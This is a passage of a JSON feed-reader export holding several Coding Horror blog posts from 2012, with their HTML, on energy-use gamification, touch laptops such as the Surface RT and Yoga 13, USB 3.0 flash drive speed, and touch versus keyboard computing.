guiding and nudging your online community through their collective adventure, without violating the continuity of your own little universe? If so, you could do a whole heck of lot worse than reading <a href=\"http://www.amazon.com/dp/059615979X/?tag=codihorr-20\">Building Web Reputation Systems</a> and following <a href=\"https://twitter.com/frandallfarmer\">@FRandallFarmer</a> on Twitter.</p><table><tr><td class=\"welovecodinghorror\">[advertisement] Hiring developers? Post your open positions with <a href=\"http://careers.stackoverflow.com\" rel=\"nofollow\">Stack Overflow Careers</a> and reach over 20MM awesome devs already on Stack Overflow. Create <a href=\"http://careers.stackoverflow.com/jobs/post\" rel=\"nofollow\"> your satisfaction-guaranteed job listing</a> today!</td></tr></table>","author":false,"_id":{"$wrap":"$oid","v":1026}}
{"k":"0000000084","o":"0000007049","v":"001"}
{"_id":1027,"_uid":1027,"_dt":1373741607095,"_s":"acbd06d19c9254348ffb5c7dc34dd8ef"}
{"subscription":{"$wrap":"$oid","v":16},"link":"http://www.codinghorror.com/blog/2012/11/for-a-bit-of-colored-ribbon.html","title":"For a Bit of Colored Ribbon","published":{"$wrap":"$date","v":1353921090000,"h":"2012-11-26T09:11:30.000Z"},"starred":false,"read":false,"content":"<p>For the last year or so, I've been getting these two page energy assessment reports in the mail from Pacific Gas & Electric, our California utility company, comparing our household's energy use to those of the houses around us.<p><p>Here's the relevant excerpts from the latest report; click through for a full-page view of each page.</p><p><a href=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d3e2b150d970c-pi\"><img  alt=\"Pge-page-1-small\" title=\"Pge-page-1-small\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017c33fc34b6970b-800wi\" width=\"720\" height=\"293\" style=\"border: 1px solid silver\" /></a></p><p><a href=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d3e2b11b4970c-pi\"><img  alt=\"Pge-page-2-small\" title=\"Pge-page-2-small\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017c33fc369f970b-800wi\" width=\"720\" height=\"261\" style=\"border: 1px solid silver\"  /></a></p><p>These poor results are particularly galling because I go far out of my way to Energy Star all the things, I use LED light bulbs just about everywhere, we set our thermostat appropriately, and we're <i>still</i> getting crushed. I have no particular reason to care about this stupid energy assessment report showing our household using 33% more energy than similar homes in our neighborhood. <b>And yet… I must win this contest</b>. I can't let it go.</p><ul><li>Installed a <a href=\"http://www.amazon.com/dp/B009GDHYPQ/?tag=codihorr-20\">Nest 2.0 learning thermostat</a>.<li>I made sure every last bulb in our house that gets any significant use is LED. Fortunately there are some pretty decent <a href=\"http://www.amazon.com/dp/B0064AE2K4/?tag=codihorr-20\">$16 LED bulbs on Amazon now</a> offering serviceable 60 watt equivalents at 9 watt, without too many early adopter LED quirks (color, dimming, size, weight, etc).<li>I even put <a href=\"http://www.amazon.com/dp/B004UGPUUK/?tag=codihorr-20\">appliance LED bulbs</a> in our refrigerator and freezer.<li>Switched to a <a href=\"http://www.amazon.com/dp/B000LV7W4K/?tag=codihorr-20\">low-flow shower head</a>.<li>Upgraded to a high efficiency tankless water heater, the <a href=\"http://www.noritz.com/commercial/products/commercial_products/ncc1991_series_condensing_tankless_water_heater/\">Noritz NCC1991-SV</a>.<li>Nearly killed myself trying to source LED candelabra bulbs for the fixture in our dining room which has 18 of the damn things, and is used quite a bit now with <a href=\"http://www.codinghorror.com/blog/2011/10/on-parenthood.html\">the twins</a> in the house. Turns out, 18 times any number … is still kind of a large number. In cash.</ul><p>(Most of this has not helped much on the report. The jury is still out on the Nest thermostat and the candelabra LED bulbs, as I haven't had them long enough to judge. I'm gonna <a href=\"http://soundcloud.com/maddecent/sets/blood-bros-series/\">defeat this thing, man!</a>)</p><p>I'm ashamed to admit that it's only recently I realized that this technique – showing a set of metrics alongside your peers – is <i>exactly</i> the same thing we built at Stack Overflow and <a href=\"http://stackexchange.com\">Stack Exchange</a>. Notice any resemblance on the user profile page here?</p><p><a href=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d3e2b1611970c-800wi\"><img class=\"asset  asset-image at-xid-6a0120a85dcdae970b017c33fc3a8c970b image-full\" alt=\"Stack-overflow-user-page-small\" title=\"Stack-overflow-user-page-small\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017c33fc3a8c970b-800wi\" width=\"720\" height=\"544\" /></a></p><p>You've tricked me into becoming obsessed with understanding and reducing my household energy consumption. Something that not only benefits me, but also benefits the greater community and, more broadly, benefits the entire world. You've beaten me at my own game. Well played, Pacific Gas & Electric. <i>Well played</i>.</p><a href=\"https://twitter.com/davetron5000/status/250692475088404481\"><img alt=\"Davetron5000-tweet\" title=\"Davetron5000-tweet\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d3e2b40b1970c-800wi\" width=\"571\" height=\"318\" /></a><p>This peer motivation stuff, <a href=\"http://www.codinghorror.com/blog/2011/10/the-gamification.html\">call it gamification if you must</a>, really works. That's why we do it. But these systems are like firearms: so powerful they're kind of dangerous if you don't know what you're doing. If you don't think deeply about <i>what</i> you're incentivizing, <i>why</i> you're incentivizing it, and the full ramifications of all emergent behaviors in your system, you may end up with … something darker. <a href=\"http://xoxco.com/clickable/i-love-my-chicken-wire-mommy\">A lot darker</a>.</p><blockquote>The key lesson for me is that our members became very thoroughly obsessed with those numbers. <b>Even though points on Consumating were redeemable for absolutely nothing, not even a gold star, our members had an unquenchable desire for them.</b> What we saw as our membership scrabbled over valueless points was that there didn't actually need to be any sort of material reward other than the points themselves. We didn't need to allow them to trade the points in for benefits, virtual or otherwise. It was enough of a reward for most people just to see their points wobble upwards. If only we had been able to channel that obsession towards something with actual value!</blockquote><p>Since <a href=\"http://www.codinghorror.com/blog/2012/02/farewell-stack-exchange.html\">I left Stack Exchange</a>, I've had a difficult time explaining what exactly it is I do, if anything, to people. I finally settled on this: what I do, what I'm best at, what I love to do more than anything else in the world, is <b>design massively multiplayer games for people who like to type paragraphs to each other</b>. I channel their obsessions – and mine – into something positive, something that they can learn from, something that creates wonderful reusable artifacts for the whole world. And that's what I still hope to do, because I have an endless well of obsession left.</p><p>Just ask PG&E.</p><table><tr><td class=\"welovecodinghorror\">[advertisement] What's your next career move? <a href=\"http://careers.stackoverflow.com/\" rel=\"nofollow\">Stack Overflow Careers</a> has the best job listings from great companies, whether you're looking for opportunities at a startup or Fortune 500. You can search our <a href=\"http://careers.stackoverflow.com/jobs\" rel=\"nofollow\">job listings</a> or <a href=\"http://careers.stackoverflow.com/cv\" rel=\"nofollow\">create a profile</a> and let employers find you.</td></tr></table>","author":false,"_id":{"$wrap":"$oid","v":1027}}
{"k":"0000000084","o":"0000015102","v":"001"}
{"_id":1028,"_uid":1028,"_dt":1373741607095,"_s":"f61824f8aed416954376acae5db227ce"}
{"subscription":{"$wrap":"$oid","v":16},"link":"http://www.codinghorror.com/blog/2012/11/touch-laptops.html","title":"Touch Laptops","published":{"$wrap":"$date","v":1353317018000,"h":"2012-11-19T09:23:38.000Z"},"starred":false,"read":false,"content":"<p>I'm a little embarrassed to admit how much I like the <a href=\"http://www.microsoft.com/Surface/\">Surface RT</a>. I wasn't expecting a lot when I ordered it, but after a day of use, I realized this was more than Yet Another Gadget. It might represent a <b>brave new world of laptop design</b>. How can you not love a laptop that lets you touch <a href=\"http://www.imdb.com/title/tt0070948/\">Zardoz</a> to unlock it?</p><p><a href=\"http://www.imdb.com/title/tt0070948/\"><img alt=\"Zardoz-surface-unlock\" title=\"Zardoz-surface-unlock\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d3dd3f093970c-800wi\" width=\"700\" /></a></p><p>(I'll leave the particular unlock gestures I chose to your imagination. Good luck <a href=\"http://www.codinghorror.com/blog/2012/09/computer-crime-then-and-now.html\">hacking this password</a>, Mitnick!)</p><p>I have <a href=\"http://www.codinghorror.com/blog/2012/09/the-last-pc-laptop.html\">an ultrabook I like</a>, but the more I used the Surface, the more obsolete it seemed, because I couldn't touch anything on the screen. I found touch interactions on Surface highly complementary to the keyboard. Way more than I would have ever believed, because I lived through the terror that was Pen Computing. If you need precision, you switch to the mouse or touchpad – but given the increasing prevalence of touch-friendly app and web design, that's not as often as you'd think. Tablets are selling like hotcakes, and every day the world becomes a more touch friendly place, with simpler apps that more people can understand and use on basic tablets. This a good thing. But this also means <b>it is only a matter of time before all laptops must be touch laptops</b>.</p><p>I've become quite <s>obsessed</s> enamored with this touch laptop concept. I've used the Surface a <i>lot</i> since then. I own two, including the touch and type covers. I also impulsively splurged on a <a href=\"http://www.lenovo.com/products/us/laptop/ideapad/yoga/yoga-13/\">Lenovo Yoga 13</a>, which is a more traditional laptop form factor.</p><p><a href=\"http://www.lenovo.com/products/us/laptop/ideapad/yoga/yoga-13/\"><img  alt=\"Yoga-13-rotation\" title=\"Yoga-13-rotation\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017c33b92a5d970b-800wi\" width=\"700\" height=\"575\" /></a><br /></a></p><p>One of the primary criticisms of the Surface RT is that, since it is an ARM based Tegra 3 device, it does not run traditional x86 apps. That's likely also why it comes with a bundled version of Office 2013. Well, the Yoga 13 resolves that complaint, because it's a Core i5 Ivy Bridge machine. But there is a cost for this x86 compatibility:</p><table cellpadding=2 cellspacing=2 width=\"500\"><tr><td> </td><td><b>Surface RT</b></td><td><b>Surface Pro</b></td><td><b>Yoga 13</b></td></tr><tr><td>weight</td><td>1.5 lb</td><td>2.0 lb</td><td>3.4 lb</td></tr><tr><td>volume</td><td>27\"</td><td>39\"</td><td>78\"</td></tr><tr><td>runtime</td><td>8 hr</td><td>6? hr</td><td>5.5 hr</td></tr><tr><td>display</td><td>10.6\" 1366×768</td><td>10.6\" 1920×1080</td><td>13.3\" 1600×900</td></tr><tr><td>memory</td><td>2 GB / 32 GB</td><td>4 GB / 64 GB</td><td>4 GB / 128 GB</td></tr><tr><td>price</td><td>$599</td><td>$999</td><td>$999</td></tr></table></p><p>The size comparison isn't entirely fair, since the Yoga is a 13.3\" device, and the Surface is a 10.6\" device. But Surface Pro has x86 internals and is otherwise as identical to the Surface RT as Microsoft could possibly make it, and it's still 44% larger and 33% heavier. <b>Intel inside comes at a hefty cost in weight, battery life, and size</b>.</p><p>You do get something for that price, though: compatibility with the vast library of x86 apps, and speed. The Yoga 13 is <i>absurdly</i> fast by tablet standards. Its Sunspider score is approximately 150 ms, compared to my iPad 4 at 738 ms, and the Surface RT at 1036 ms. Five hours of battery life might not seem like such a bad tradeoff for <i>six times the performance</i>.</p><p>I like the Yoga 13 a lot, and it is getting <a href=\"http://www.engadget.com/2012/11/15/lenovo-ideapad-yoga-13-review/\">deservedly good reviews</a>. Some reviewers think it's the <a href=\"http://www.popsci.com/gadgets/article/2012-11/lenovo-yoga-13-review-windows-8-laptop-you-should-buy\">best Windows 8 laptop</a> available right now. It is a fine replacement for my ultrabook, and as long as you <a href=\"http://forums.lenovo.com/t5/IdeaPad-IdeaTab-Slate-Tablets/Ideapad-Yoga-hard-disk-allocation/m-p/913425#M13007\">fix the brain-damaged default drive partitioning</a>, scrape off the handful of stickers on it, and uninstall the few pre-installed craplets, it is eminently recommendable. You can also easily <a href=\"http://www.youtube.com/watch?v=Z5uCooHm4kw\">upgrade it from 4 GB to 8 GB</a> of RAM for about $40.</p><p>But there were things about the practical use of a touch laptop, subtle things that hadn't even occurred to me until I tried to sit down and use one for a few hours, that made me pause:</p><ol><li><b>The screen bounces when you touch it</b>. Maybe I just have hulk-like finger strength, but touching a thin laptop screen tends to make it bounce back a bit. That's … exactly what you <i>don't</i> want in a touch device. I begin to understand why the Surface chose its \"fat screen, thin keyboard\" design rather than the traditional \"thin screen, fat keyboard\" of a laptop. You need the inertia on the side you're touching. The physics of touching a thin, hinged laptop screen are never going to be particularly great. Yes, on the Yoga I can wrap the screen around behind the keyboard, or even prop it up like a tent – but this negates the value of the keyboard which is the biggest part of the touch laptop story! If I wanted a keyboardless tablet, I'd use one of the four I have in the house already. And the UPS guy just delivered a Nexus 10.<br/><br/><li><b>A giant touchpad makes the keyboard area too large</b>. On a typical laptop, a Texas size touchpad makes sense. On a touch laptop, giant touchpads are problematic because they push the screen even farther away from your hand. This may sound trivial, but it isn't. A ginormous touchpad makes every touch interaction you have that much more fatiguing to reach. I now see why the Surface opted for a tiny touchpad on its touch and type covers. A touchpad should be a method of last resort on a touch laptop anyway, because touch is more convenient, and if you need true per-pixel precision work, you'll plug in a mouse. Have I mentioned how convenient it is to have devices that accept standard USB mice, keyboards, drives, and so on? Because it is.<br/><br/><li><b>Widescreen is good for keyboards, but awkward for tablets</b>. A usable keyboard demands a certain minimum width, so widescreen it is; all touch laptops are going to be widescreen by definition. You get your choice between ultra wide or ultra tall. The default landscape mode works great, but rotating the device and using it in portrait mode makes it <i>super</i> tall. On a widescreen device, portrait orientation becomes a narrow and highly specialized niche. It's also <i>very</i> rough on lower resolution devices; neither the 1366×768 Surface RT nor the 1600×900 Yoga 13 really offer enough pixels on the narrow side to make portrait mode usable. You'd need a true retina class device to make portrait work in widescreen. I began to see why the iPad was shipped with a 4:3 display and not a 16:9 or 16:10 one, because that arrangement is more flexible on a tablet. I frequently use my iPad 4 in either orientation, but the Yoga and Surface are only useful in landscape mode except under the most rare of circumstances.<br/><br/><li><b>About 11 inches might be the maximum practical tablet size</b>. Like many observers, I've been amused by the race to produce the largest possible phone screen, resulting in 5\" phablets that are <a href=\"http://gigaom.com/mobile/despite-name-phablets-to-be-big-sellers-208m-in-2015/\">apparently quite popular</a>. But you'll also note that <a href=\"http://daringfireball.net/2012/10/ipad_mini\">even the most ardent Apple fans</a> seem to feel that the 7\" iPad mini is an inherently superior form factor to the 10\" iPad. I think both groups are fundamentally correct: for a lot of uses, the 3.5\" phone really is too small, and the 10\" tablet really is too big. As a corollary to that, I'd say anything larger than the 10.6\" Surface is <i>far</i> too large to use as a tablet. Attempting to use the 13.3\" Yoga as a tablet is incredibly awkward, primarily because of the size. Even if the weight and volume were pushed down to imaginary Minority Report levels, I'm not sure I would want a 13.3\" tablet on my lap or in my hands. There must be a reason the <a href=\"http://en.wikipedia.org/wiki/Letter_(paper_size)\">standard letter page size</a> is 8&half; × 11\", right?<br/><br/><li><b>All-day computing, or, 10 hours of battery life</b>. The more devices I own, the more I begin to appreciate those that I can use for 8 to 10 hours before needing to charge them. There is truly something a little magical about that 10 hour battery life number, and I can now understand why Apple seemed to target 9-10 hours of battery life in their initial iPad and iPhone designs. A battery life of 4 to 6 hours is nothing to sneeze at, but … I feel anxiety about carrying the charger around, whether I've charged recently or not, and I worry over screen brightness and other battery maximization techniques. When I can safely go 8 to 10 hours, I figure that even if I use the heck out of the device – as much as any human being reasonably could in a single day – I'll still safely make it through and I can stick it in a charger before I go to bed.</ol><p><p>To appreciate just how extreme portrait mode is on a widescreen tablet, experience it yourself:</p><table><tr><td valign=\"top\"><a href=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d3de872f7970c-pi\"><img alt=\"Yoga-13-landscape-small\" title=\"Yoga-13-landscape-small\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d3dd4960d970c-800wi\" width=\"350\" /></a></td><td valign=\"top\"><a href=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017c33b9e3d6970b-pi\"><img alt=\"Yoga-13-portrait-small\" title=\"Yoga-13-portrait-small\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017ee549a179970d-800wi\" width=\"350\" /></a></td></tr></table><p>This isn't specific to touch laptops; it's a concern for all widescreen devices. I have the same problem with the taller iPhone 5. Because I now have to choose between super wide or super tall, it is a less flexible device in practice.</p><p>The Yoga 13, if representative of the new wave of Windows 8 laptops, is a clear win even if you have no intention of ever touching your screen:</p><ul><li>It boots up incredibly fast, in a few seconds.<li>It wakes and sleeps incredibly fast, nearly instantaneously.<li>The display is a <a href=\"http://www.codinghorror.com/blog/2012/07/the-ips-lcd-revolution.html\">high quality IPS model</a>.<li>A rotating screen offers a number of useful modes: presentation, (giant) tablet, standard laptop.<li>Touchpad and keyboard work fine; at the very least, they're no worse than the typical PC laptop to me.<li>Does the prospect of using Windows 8 frighten and disturb you? No worries, smash Windows+D on your keyboard immediately after booting and pretend you're using Windows 7.5. Done and done.</ul></p><p>It's a nice laptop. You could do far worse, and many have. In the end, <b><a href=\"http://www.lenovo.com/products/us/laptop/ideapad/yoga/yoga-13/\">the Yoga 13</a> is just a nice laptop with a touchscreen slapped on it</b>. But the more I used the Yoga the more I appreciated the subtle design choices of Surface that make it a far better <i>touch</i> laptop. I kept coming back to how much I enjoyed using the Surface as the platonic ideal of what touch laptops should be.</p><p>Yes, it is a bummer that <a href=\"http://www.microsoft.com/Surface/\">the only currently available Surface</a> is ARM based and does not run any traditional Windows apps. It's easy to look at the x86 performance of the Yoga 13 and assume that Windows on ARM is a cute, temporary throwback to Windows NT on Alpha or MIPS which will never last, and understandably so. Do you see anyone running Windows on Alpha or MIPS CPUs today? But I'm mightily impressed with the Tegra 3 SOC (system-on-a-chip) that runs both the Surface RT and the Nexus 7. Upcoming Tegra releases, <a href=\"http://en.wikipedia.org/wiki/Tegra#Upcoming_releases\">all named after superheroes</a>, promise <b>75 times</b> the performance of Tegra 2 by 2014. I can't quite determine how much faster Tegra 3 was than Tegra 2, but even if it is \"only\" ten times faster by 2014, that's … amazing.</p><p>I think we're beginning to uncover the edges of a world where lack of x86 compatibility is no longer the kiss of death it used to be. It's unclear to me that Intel can ever reach equivalent performance per watt with ARM; Intel's ultra-low-end <a href=\"http://gigaom.com/mobile/intel-v-arm-the-chromebook-performance-battle/\">Celeron 847 is twice as fast as the ARM A15</a>, but it's also <a href=\"http://ark.intel.com/products/56056/Intel-Celeron-Processor-847-2M-Cache-1_10-GHz\">17 watts TDP</a>. In a land of ARM chips that pull an absolute maximum of 4 watts at peak, slapping Intel Inside will instantly double the size and weight of your device – or halve its battery life, your choice. Intel's been trying to turn the battleship, but with <a href=\"http://www.wired.com/business/2012/08/ff_intel/all/\">very limited success so far</a>. Haswell, the successor to the Ivy Bridge CPUs in the Surface Pro and Yoga 13, only gets to 10 watts at idle. And Intel's long neglected Atom line, thanks to years of institutional crippling to avoid cannibalizing Pentium sales, is poorly positioned to compete with ARM today.</p><p>Still, <b>I would not blame anyone for waiting on the <a href=\"http://www.microsoft.com/Surface/en-US/surface-with-windows-8-pro/home\">Surface Pro</a></b>. A high performance, HD touch laptop in the Surface form factor that runs every x86 app you can throw at it is a potent combination … even if it is 44% larger and 33% heavier.</p><table><tr><td class=\"welovecodinghorror\">[advertisement] <a href=\"http://careers.stackoverflow.com/\" rel=\"nofollow\">Stack Overflow Careers</a> matches the best developers (you!) with the best employers. You can search our <a href=\"http://careers.stackoverflow.com/jobs\" rel=\"nofollow\">job listings</a> or <a href=\"http://careers.stackoverflow.com/cv\" rel=\"nofollow\">create a profile</a> and even let employers find you.</td></tr></table>","author":false,"_id":{"$wrap":"$oid","v":1028}}
{"k":"0000000084","o":"0000004012","v":"001"}
{"_id":1029,"_uid":1029,"_dt":1373741607096,"_s":"7eb6fe0498291ca7c723330374343982"}
{"subscription":{"$wrap":"$oid","v":16},"link":"http://www.codinghorror.com/blog/2012/11/a-ssd-in-your-pocket.html","title":"A SSD in Your Pocket","published":{"$wrap":"$date","v":1352794884000,"h":"2012-11-13T08:21:24.000Z"},"starred":false,"read":false,"content":"<p>I woke up a few days ago and realized I was still carrying <a href=\"http://www.codinghorror.com/blog/2010/08/whats-on-your-utility-belt.html\">the same 32 GB USB flash drive</a> on my keychain that I purchased in 2010. I thought to myself, this is an unacceptable state of affairs. Totally. Unacceptable.</p><p>It's been few years since I seriously looked at USB drive performance. Premium USB flash drives typically eke out <a href=\"http://www.codinghorror.com/blog/2008/06/large-usb-flash-drive-performance.html\">about 10-20 MB per second</a>, strongly favoring reads, but I've recently purchased a number of inexpensive 4 GB USB drives that barely got to 4 MB per second. That's OK, since they were only intended as cheap <s><a href=\"http://www.codinghorror.com/blog/2005/02/the-floppy-drive-must-die.html\">floppy drive</a></s> CD and DVD replacements. Based on that experience, I wasn't expecting much improvement in the status quo.</p><p>USB 3.0 is finally becoming somewhat prevalent on PCs and Macs, so I figured I'd:</p><ul><li>Switch to a current-generation USB 3.0 flash drive.<li>Bump up to 64 GB storage this generation, one step over the 32 GB model I currently carry.<li>Optimistically hope against hope that they've gotten fast enough by now to get anywhere near USB 2.0 throughput limits.</ul><p>I checked around and the <a href=\"http://www.amazon.com/dp/B004ZNA3UA/?tag=codihorr-20\">Patriot Supersonic Magnum</a> got good reviews. The price seemed about right at $75 for a 64 GB device. So I bought one. I plugged it in to one of the USB 3.0 ports on my PC and …</p><p><img alt=\"Usb-drive-read\" title=\"Usb-drive-read\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017ee50c0384970d-800wi\" width=\"463\" height=\"294\" /></p><p><img alt=\"Usb-drive-write\" title=\"Usb-drive-write\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d3d96fccf970c-800wi\" width=\"463\" height=\"294\" /></p><p>Holy. Crap.</p><p><b>237 MB/s reads and 143 MB/s writes?</b> <i>Yes please!</i></p><p>Needless to say, this thing handily saturates a USB 2.0 connection at around 27 - 30 MB/sec but plug it into one of those blue USB 3.0 ports on newer Macs or PCs and prepare to feel like <a href=\"http://iconicphotos.wordpress.com/2010/05/31/blown-away-man/\">the \"blown away\" guy in the Maxell ad</a>.</p><p>I haven't run a full set of benchmarks on this guy, but the only downside I've noticed so far is that it is a bit chunkier in width than my previous USB flash drive. It might be a bit more to carry, and might not fit some USB ports depending on what's adjacent.</p><p><a href=\"http://www.amazon.com/dp/B004ZNA3UA/?tag=codihorr-20\"><img alt=\"Patriot-magnum-64gb\" title=\"Patriot-magnum-64gb\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017c33688c47970b-800wi\" width=\"550\" height=\"345\" /></a></p><p>Now I feel like a total dork for continuing to carry around a 2010 era flash drive that I <i>thought</i> had decent performance at 20 MB/sec. Forget that noise. Now we can <b>darn near carry pocket solid state hard drives on our keychains!</b> Nobody told me, man!</p><p>So now I'm telling you. Enjoy.</p><table><tr><td class=\"welovecodinghorror\">[advertisement] What's your next career move? <a href=\"http://careers.stackoverflow.com/\" rel=\"nofollow\">Stack Overflow Careers</a> has the best job listings from great companies, whether you're looking for opportunities at a startup or Fortune 500. You can search our <a href=\"http://careers.stackoverflow.com/jobs\" rel=\"nofollow\">job listings</a> or <a href=\"http://careers.stackoverflow.com/cv\" rel=\"nofollow\">create a profile</a> and let employers find you.</td></tr></table>","author":false,"_id":{"$wrap":"$oid","v":1029}}
{"k":"0000000084","o":"0000011908","v":"001"}
{"_id":1030,"_uid":1030,"_dt":1373741607096,"_s":"cde781507787b3b2f6b24bce31299442"}
{"subscription":{"$wrap":"$oid","v":16},"link":"http://www.codinghorror.com/blog/2012/11/do-you-wanna-touch.html","title":"Do You Wanna Touch","published":{"$wrap":"$date","v":1351764881000,"h":"2012-11-01T10:14:41.000Z"},"starred":false,"read":false,"content":"<p>Traditional laptops may have reached an <a href=\"http://www.codinghorror.com/blog/2012/09/the-last-pc-laptop.html\">evolutionary dead-end</a> (or, more charitably, a plateau), but it is an <i>amazing</i> time for things that … aren't quite traditional laptops.</p><p>The Nexus 7 is <a href=\"http://www.theverge.com/2012/6/29/3125396/google-nexus-7-review\">excellent</a>, the Nexus 10 <a href=\"http://www.wired.com/gadgetlab/2012/10/nexus-10-hands-on-google-samsung/\">looks fantastic</a>, I can't wait to get my hands on the <a href=\"http://www.macrumors.com/2012/10/30/4th-generation-ipad-benchmarks-show-1-4ghz-dual-core-processor-1gb-of-ram/\">twice-as-fast</a> iPad 4, the new Chromebooks are <a href=\"http://www.anandtech.com/show/6422/samsung-chromebook-xe303-review-testing-arms-cortex-a15\">finally decent</a> and priced right, and then there's the <a href=\"http://www.theverge.com/2012/10/23/3540550/microsoft-surface-review\">Microsoft Surface RT</a>. In short, <b>it is a fantastic time to be a <i>computer nerd</i>.</b></p><p><a href=\"http://www.imdb.com/title/tt0088000/\"><img alt=\"Revenge of the nerds\" title=\"Revenge of the nerds\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d3d2a90fd970c-pi\" width=\"370\" height=\"558\" /></a></p><p>I <a href=\"http://www.codinghorror.com/blog/2007/01/if-loving-computers-is-wrong-i-dont-want-to-be-right.html\">love computers</a>, always have, always will. <b>My strategy with new computing devices is simple: I buy 'em all, then try living with them.</b> The devices that fall away from me over time – the ones that gather dust, or that I forget about – are the ones I eventually get rid of. So long, Kindle Fire! I knew that the Nexus 7 was really working for me when I gave mine to my father as a spontaneous gift while he was visiting, then missed it sorely when waiting for the replacement to arrive.</p><p>As I use these devices, I've grown more and more sold on the idea that touch is going to dominate the next era of computing. <a href=\"http://www.codinghorror.com/blog/2012/10/the-pc-is-over.html\">This reductionism is inevitable and part of the natural evolution of computers</a>. Remove the mouse. Remove the keyboard. Remove the monitor. Reducing a computer to its <i>absolute minumum</i> leads us inexorably, inevitably to the tablet (or, if a bit smaller, the phone). All you're left with is a flat, featureless slate that invites you to touch it. <b>Welcome to the future, here's your … rectangle.</b></p><p><img  alt=\"tablets\" title=\"tablets\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017ee4a07595970d-800wi\" width=\"600\" height=\"436\" /></p><p>I've stopped thinking of touch as some exotic, add-in technology contained in specialized devices. I belatedly realized that <a href=\"http://www.youtube.com/watch?v=XELpxApT8Kc\">I love to touch computers</a>. And why not? We constantly point and gesture at everything in our lives, including our screens. It's completely natural to want to interact with computers by touching them. That's why the more unfortunate among us have <a href=\"http://www.codinghorror.com/blog/2008/05/cleaning-your-display-and-keyboard.html\">displays covered in filthy fingerprints</a>.</p><p>Although I love my touch devices, one thing I've noticed is that <b>they are a major disincentive to writing actual paragraphs</b>. On screen keyboards get the job done, but if I have to scrawl more than a Twitter length reply to someone on a tablet or phone, it's so much effort that I just avoid doing it altogether, postponing indefinitely until I can be in front of a keyboard. By the time that happens I've probably forgotten what I wanted to say in the first place, or that I even needed to reply at all. Multiply that by millions or billions, and you have a whole generation technologically locked into a backwater of minimal communication. Yelp, for example, does <a href=\"https://twitter.com/codinghorror/status/249912609439088640\">not allow posting reviews from their mobile app</a> because when they did, all they got was LOL OMG <i>raspberry</i> poop Emoji.</p><p><img alt=\"Omg-raspberry-poop\" title=\"Omg-raspberry-poop\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017ee4a06941970d-800wi\" width=\"326\" height=\"122\" /></p><p>It's not good. In fact, it's a little scary. I realize that there are plenty of ways of creating content that don't involve writing, but writing is <a href=\"http://www.codinghorror.com/blog/2011/02/how-to-write-without-writing.html\">pretty damn fundamental</a> to communication and civilization as we know it. Anything that adds a significant barrier to the act of placing words on a page is kind of dangerous – and a major regression from the world where every computer had a keyboard in front of it, inviting people to write and communicate with each other. So the idea that billions of people in the future will be staring at touchscreen computers, Instagramming and fingerpainting their thoughts to each other, leaves me with deeply mixed feelings. As Joey Hess <a href=\"http://joey.hess.usesthis.com/\">said</a>:<p><blockquote>If it doesn't have a keyboard, I feel that my thoughts are being forced out through a straw.</blockquote></p><p>When I pre-ordered the <a href=\"http://www.microsoft.com/surface/en-US/surface-with-windows-rt/home\">Microsoft Surface RT</a>, I wasn't expecting much. This is a version one device from a company that has never built a computer before, running a <a href=\"http://www.codinghorror.com/blog/2012/07/betting-the-company-on-windows-8.html\">brand new and controversial operating system</a>. On paper, it doesn't seem like a significant change from all the other tablets on the market, and its primary differentiating feature – the touch keyboard – can be viewed as merely flipping a regular laptop over, so the \"fat\" side is on the display rather than the keyboard.</p><a href=\"http://www.microsoft.com/surface/en-US/surface-with-windows-rt/home\"><img alt=\"Laptop vs. Surface\" title=\"Laptop vs. Surface\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d3d2aadd6970c-800wi\" width=\"600\" height=\"239\" /></a></p><p>Surface is just like the first iPad in that it has all the flaws and rough edges you'd expect in a version one device. But it is also like the first iPad in that <b>there is undeniably the core of something revelatory and transformative here – a vision of the future of computing that <i>doesn't</i> sacrifice either keyboard or touch.</b></p><p>Reviewers think Surface is intended to be a tablet killer, but it isn't. It's a laptop killer. After living with the Surface RT for a few days now, I'm convinced that this form factor is the replacement and way forward for the stagnant laptop. I can't even remember the last time I was this excited about a computer. The more I use it, the more I think that touch plus keyboard is the future of all laptops.</p><p>How wonderful it is to flip open the Surface and quickly type a 4 paragraph email response when I need to. How wonderful it is to browse the web and touch whatever I want to. And switching between the two modes of interaction – sometimes typing, sometimes touching – is completely natural. Remember when I talked about <a href=\"http://www.codinghorror.com/blog/2008/03/revisiting-keyboard-vs-the-mouse-pt-1.html\">two-fisted computing</a>, referring to the mouse and keyboard working in harmony? With Surface, I found that also applies to touch. In spades.</p><p><a href=\"http://www.microsoft.com/surface/en-US/surface-with-windows-rt/home\"><img alt=\"The Surface RT in my lap\" title=\"The Surface RT in my lap\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d3d2b3765970c-800wi\" width=\"700\" height=\"525\" /></a></p><p>This isn't a review, per se, but let me get into a few specifics:<ul><li>Yes, it is ridiculous that the keyboard cover is not included in the base Surface, as the near-perfect integration of keyboard with touch is the whole story here. Don't even <i>consider</i> buying a Surface without the touch keyboard cover. Within an hour or so I was hitting 80% of my regular typing speed on it, and it's firm enough to be used on a lap without too much loss of accuracy. Astonishingly, the tiny fabric touchpad is quite good, better than the ones I've used on many laptops. Which probably says more about the sad state of the PC ecosystem than it does about Surface, but still.<li>Yeah, yeah, it doesn't run x86 apps. So your beloved copy of Windows Landscape Designer 1998 won't run on Surface RT. You'll need to wait a few months for Surface Pro to do that, but you'll pay the Intel Premium™ in price, battery life, and size. Rumor has it that Intel will get their act together with Haswell, and finally be competitive with ARM in price, performance, and 